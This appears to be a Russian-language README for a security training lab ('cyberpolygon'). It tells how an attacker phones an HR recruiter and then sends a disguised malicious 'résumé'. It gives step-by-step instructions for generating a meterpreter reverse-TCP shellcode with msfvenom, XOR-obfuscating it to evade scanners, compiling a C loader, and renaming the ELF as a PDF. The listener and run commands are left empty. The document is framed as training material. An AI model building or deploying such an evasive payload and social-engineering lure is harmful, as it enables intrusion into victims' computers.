# cyberpolygon
cyberpolygon for information security training


### Для работы стенда необходимо ввести след команды

### Сценарий

## Что делает хакер

Хакер ищет себе жертву, которой в дальнейшем отправит вредоносный файл. С помощью социальной инженерии злоумышленник находит одну компанию на hh и звонит рекрутеру. Общаясь он рассказывает, как заинтересован в работе. После их разговора, хакер обещает прислать денису на почту резюме. 
На деле же вместо резюме лежит заархивированный вредоносный файл.

## что делает hr

Кадровик Денис заходит на почту и видит примерно следующее сообщение, которое оставил ему его телефонный собеседник: 

“Здравствуйте еще раз! я заинтересован в вашей работе. Вот мое резюме” 
Его впечатлил телефонный разговор и он бежит побыстрее посмотреть его резюме.

!!!!!!!!!!!!! 

Тем временем у атакующего включен meterpreter listener и он получает оболочку , тем самым имея возможность загрузить любые файлы и выполнить любой код. 

Чем он и пользуется, закидывая hr-ру файлик hacked.txt , в котором сообщается, что тот взломан

## Описание созданного вируса

Вирус состоит из 2-х файлов : hack.c , encoder_beautiful.c 

Создадим переменную массива беззнаковых символов с именем buf, которая содержит наш шелл-код вывод в формате C из msfvenom. Это в будущем поможет нам получить оболочку и выполнять любые команды на компьютере жертвы.

Чтобы избежать обнаружения сканерами, мы замаскируем исходную строку шелл-кода. Мы можем сделать это, создав программу-кодировщик (encoder_beautiful) для выполнения операции XOR с нашей полезной нагрузкой meterpreter.

Затем мы возьмем выходные данные нашего кодировщика и заменим полезную нагрузку нашей исходной оболочки C на запутанную версию, которую мы создали. И добавим декодер XOR в нашу исходную программу на C, чтобы деобфусцировать полезную нагрузку в памяти перед ее выполнением.

#### Порядок команд для получения готового вируса

Сгенерируем 64-битный незакодированный шеллкод с помощью msfvenom с типом вывода «c» на Kali след. командой : 
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f c 

Скопируем char buf[] и вставим это в программу encoder_beautiful.c

Скомпилируем командой gcc encoder_beautiful.c -o encoder_beautiful.elf

запустим ./encoder_beautiful.elf - теперь это надо скопировать

Затем мы вставим char buf[] в программу на C, которая будет действовать как оболочка для загрузки и запустит шеллкод.

Скомпилировать след. командой файл hack.c

Получен готовый вирус, который необходимо закинуть жертве. Попробуем переименовать его вместо hack.elf в resume_for_hr.pdf

Настроим прослушиватель:



Запустим:


Запустим:
